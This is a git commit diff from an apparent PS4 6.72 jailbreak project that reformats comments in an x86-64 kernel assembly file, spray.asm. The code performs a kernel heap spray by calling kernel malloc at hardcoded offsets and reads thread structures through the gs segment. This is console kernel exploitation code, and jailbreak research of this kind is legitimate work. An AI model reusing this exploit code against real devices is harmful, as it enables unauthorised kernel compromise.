65e3064000290cb3f0f23e2db87d83b07ccd562a
̸̨̡͉̯̟͇̗͈͙͙̝͍̽̾̒Ă̶̺̝̞̊́́̏̈͌̾̍̀̈́̂̋̔̇͐̔̀͘̚͜ ̴̢͈̜̦͔̦̦̖̗͚̦̈́ͅZ̶̫̥̭͎̝̻̮̘̯̳̿ͅ ̴͈̅͊͒͂͌̆͂͠͠H̴̨̛̺͕̳̱͙̩̻̩̖̲͙̘̓̾̌ͅͅ ̷͎̥̖̬̼͎̹̼̭̺̪̯̱̥̖̄̊̈́̀̃̀̂̐͊̐̄̄́̅͂̈́̋̚͠͝À̸̢̝̖͇̤̹̥͙͎̳̼̬̲̰̼̩͛̀̒̋͛̈́̊ ̴̣̹̩̥̺̙̪͎͕̭̟̲͇̘̺̈́̎̿̇́͝R̷̢̢̧̡̢̲̺̳̖̹͈̙̰̙̥̼̗͍̒̌ͅ <96749372+a0zhar@users.noreply.github.com>
2022-12-16 15:40:58 +0100

    Fixed Formatting, Reduced Size

--- 672/ps4jb (672) src/spray.asm
+++ 672/ps4jb (672) src/spray.asm
@@ -26,35 +26,24 @@ kernel_entry:
 
 ; The ".malloc_loop" label marks the start of a loop.
 .malloc_loop:
-    push rcx                ; This instruction pushes the value of RCX onto the stack.
-    mov rax, [rsp+8]        ; Load the value of the kernel base (the second argument on the stack) into RAX.
-    mov edi, 0xf8           ; Set the value of EDI to 0xf8.
-    lea rsi, [rax+0x1540eb0]; Load the address of the M_TEMP symbol (presumably defined elsewhere) into RSI.
-    mov edx, 2              ; Set the value of EDX to 2.
-    add rax, 0xd7a0         ; Add the value of 0xd7a0 to RAX and stores the result back in RAX.
-    call rax                ; call the function at the address stored in RAX with arguments RSI, RDI, and RDX. 
-    ;The return value will be stored in RAX.              
-    
-    pop rcx                 ; This instruction pops the value of RCX off the stack.
-
-    ; decrement the value of RCX and jumps to the ".malloc_loop"
-    ; label if the result is not zero.
-    loop .malloc_loop
-
-pop rdi ; pop the value of RDI off the stack
-pop rsi ; pop the value of RSI off the stack
-
-; This instruction performs a bitwise AND operation between RSI and RSI, and sets
-; the zero flag in the EFLAGS register if the result is zero.
-test rsi, rsi
-
-jz .skip_closeup;Jump to the ".skip_closeup" label if the zero flag is set.
-mov rax, [gs:0]; Load the value of the "gs" segment register into RAX.
-mov rax, [rax+8]; Load the value at the address pointed to by RAX+8 into RAX.
-mov rax, [rax+0x48]; Load the value at the address pointed to by RAX+0x48 into RAX.
-mov rdx, [rax]; Load the value at the address pointed to by RAX into RDX.
-mov rcx, 512; Set the value of RCX to 512.
-
+push rcx                ; This instruction pushes the value of RCX onto the stack.
+mov rax, [rsp+8]        ; Load the value of the kernel base (the second argument on the stack) into RAX.
+mov edi, 0xf8           ; Set the value of EDI to 0xf8.
+lea rsi, [rax+0x1540eb0]; Load the address of the M_TEMP symbol (presumably defined elsewhere) into RSI.
+mov edx, 2              ; Set the value of EDX to 2.
+add rax, 0xd7a0         ; Add the value of 0xd7a0 to RAX and stores the result back in RAX.
+call rax                ; call the function at the address stored in RAX with arguments RSI, RDI, and RDX. The return value will be stored in RAX.              
+pop rcx                 ; This instruction pops the value of RCX off the stack.
+loop .malloc_loop       ; decrement the value of RCX and jumps to the ".malloc_loop" label if the result is not zero.
+pop rdi                 ; pop the value of RDI off the stack
+pop rsi                 ; pop the value of RSI off the stack
+test rsi, rsi           ; Perform a bitwise AND operation between RSI and RSI, and sets the zero flag in the EFLAGS register if the result is zero.
+jz .skip_closeup        ;Jump to the ".skip_closeup" label if the zero flag is set.
+mov rax, [gs:0]         ; Load the value of the "gs" segment register into RAX.
+mov rax, [rax+8]        ; Load the value at the address pointed to by RAX+8 into RAX.
+mov rax, [rax+0x48]     ; Load the value at the address pointed to by RAX+0x48 into RAX.
+mov rdx, [rax]          ; Load the value at the address pointed to by RAX into RDX.
+mov rcx, 512            ; Set the value of RCX to 512.
 
 .closeup_loop:
 lodsd
